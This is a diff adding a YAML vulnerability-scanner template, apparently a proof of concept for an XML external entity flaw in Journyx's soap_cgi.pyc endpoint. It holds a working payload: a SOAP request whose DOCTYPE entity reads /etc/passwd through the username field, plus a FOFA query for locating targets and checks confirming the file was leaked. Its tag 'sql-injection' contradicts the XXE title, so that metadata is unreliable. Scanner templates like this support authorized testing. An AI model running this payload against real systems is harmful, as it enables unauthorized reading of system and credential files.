@@ -1,0 +1,29 @@
+id: poc-yaml-journyx-soap-cgi-pyc-xxe
+info:
+  name: Journyx soap_cgi.pyc XML外部实体注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: journyx
+  fofa: body="Journyx"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"Journyx")
+- method: POST
+  path: /jtcgi/soap_cgi.pyc
+  headers:
+    Content-Type: application/xml
+  data: <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope
+    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    contains(content_type,"text/xml")
+
+    '
+variables: {}
+transport: http
